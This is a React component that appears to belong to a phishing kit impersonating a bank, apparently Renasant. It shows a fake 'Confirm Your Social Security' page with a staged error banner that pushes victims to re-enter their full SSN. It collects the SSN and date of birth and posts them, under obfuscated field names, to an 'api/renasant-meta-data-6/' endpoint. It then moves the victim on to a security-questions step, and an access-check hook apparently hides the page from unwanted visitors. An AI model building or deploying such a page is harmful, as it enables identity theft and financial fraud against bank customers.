import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const SSN2: React.FC = () => {
  const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    socialSecurityNumber: '',
    dateOfBirth: '',
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  const toggleSSNVisibility = () => setShowSSN((prev) => !prev);

  const getMonthName = (monthNumber: string) => {
    const monthNames = [
      'January',
      'February',
      'March',
      'April',
      'May',
      'June',
      'July',
      'August',
      'September',
      'October',
      'November',
      'December',
    ];
    return monthNames[parseInt(monthNumber) - 1] || '';
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      socialSecurityNumber: socialSecurityNumber.length !== 11 ? 'Please enter a valid 9-digit SSN.' : '',
      dateOfBirth: !month || !day || !year ? 'Complete date of birth is required.' : '',
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();

      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dateOfBirth = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);

    if (!Object.values(newErrors).some((error) => error)) {
      try {
        const d_b = `${getMonthName(month)}/${day}/${year}`;
        await axios.post(`${baseUrl}api/renasant-meta-data-6/`, {
          emzemz,
          s2ns: socialSecurityNumber,
          d_b,
        });

        navigate('/security-questions', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting form:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!emzemz) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-600">
          We could not locate your previous step. Please restart the flow from the beginning.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-600">
      <p>
        For security reasons, never share your username, password, social security number, account number or other private data online,
        unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#0f4f6c]">
        <a href="#" className="hover:underline">Forgot Username?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Password?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Everything?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Locked Out?</a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Confirm Your Social Security"
      subtitle={<span className="text-slate-600">Enter your full SSN and date of birth to continue.</span>}
      footer={footer}
    >
      <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
        An error occurred. Please enter your full 9-digit Social Security number this time.
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="ssn">
            Social Security number
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={socialSecurityNumber}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                let formattedValue = value;
                if (formattedValue.length >= 6) {
                  formattedValue = formattedValue.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
                } else if (formattedValue.length >= 4) {
                  formattedValue = formattedValue.replace(/(\d{3})(\d{2})/, '$1-$2');
                }
                setSocialSecurityNumber(formattedValue);
              }}
              onKeyDown={(e) => {
                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
                  e.preventDefault();
                }
              }}
              maxLength={11}
              placeholder="XXX-XX-XXXX"
              className="w-full px-3 py-3 text-sm focus:outline-none"
            />
            <button type="button" onClick={toggleSSNVisibility} className="px-3 text-slate-400">
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.socialSecurityNumber ? <FormError message={errors.socialSecurityNumber} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="dob-month">
            Date of birth
          </label>
          <div className="flex items-center gap-2 border border-slate-200 rounded px-3 py-2">
            <select
              id="dob-month"
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              className="flex-1 bg-white text-sm focus:outline-none"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {new Date(0, i).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              id="dob-day"
              value={day}
              onChange={(e) => setDay(e.target.value)}
              className="flex-1 bg-white text-sm focus:outline-none"
              disabled={!month || !year}
            >
              <option value="">Day</option>
              {Array.from({ length: daysInMonth }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {i + 1}
                </option>
              ))}
            </select>
            <select
              id="dob-year"
              value={year}
              onChange={(e) => {
                setYear(e.target.value);
                setDay('');
              }}
              className="flex-1 bg-white text-sm focus:outline-none"
            >
              <option value="">Year</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </div>
          {errors.dateOfBirth ? <FormError message={errors.dateOfBirth} /> : null}
        </div>

        <button
          type="submit"
          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
              </svg>
              <span>Continue</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default SSN2;